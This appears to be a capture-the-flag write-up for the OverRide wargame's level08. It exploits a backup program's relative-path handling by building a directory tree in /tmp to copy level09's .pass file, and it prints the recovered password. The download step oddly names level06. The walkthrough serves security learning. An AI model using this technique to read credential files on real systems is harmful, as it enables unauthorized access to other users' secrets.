### Download binary
``scp -P4242 level06@192.168.31.33:/home/users/level06/level06 ~/Bureau/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (refer to source code)

The main vulnerability in the provided code lies in the way the program handles file paths. Specifically, the program uses relative paths rather than absolute paths. This makes it susceptible to path traversal attacks, where an attacker can trick the program into accessing directories outside of the intended scope.

----

### Preparing the attack

Navigate to a directory you have write permissions in. The /tmp directory is a good choice as it's world-writable.

``level08@OverRide:~$ cd /tmp``


Create Malicious Directory Structure:

Craft a directory structure that, when combined with the program's relative path, leads to the file you want to backup (copy). Here, we want to copy the .pass file of level09.

``level08@OverRide:/tmp$ mkdir -p './backups/home/users/level09/'``

----

### Bypassing security

Run the Program with Target File:

``level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass``

Display the result

``level08@OverRide:/tmp$ cat backups/home/users/level09/.pass``
>fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
